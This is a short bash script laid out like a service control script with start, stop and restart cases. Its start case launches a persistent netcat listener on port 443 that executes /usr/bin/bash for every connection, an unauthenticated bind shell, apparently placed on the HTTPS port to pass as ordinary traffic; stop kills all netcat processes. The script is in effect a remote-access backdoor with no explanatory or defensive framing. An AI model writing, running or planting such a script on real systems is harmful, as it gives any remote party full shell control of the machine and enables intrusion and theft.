#!/bin/bash

case "$1" in
start)
    nc -k -lvp 443 -e /usr/bin/bash
    ;;
stop)
    pkill -9 nc
    ;;

restart)
    $0 stop
    $0 start
    ;;
*)
    echo "usage: $0 (start|stop|restart)"
;;
esac

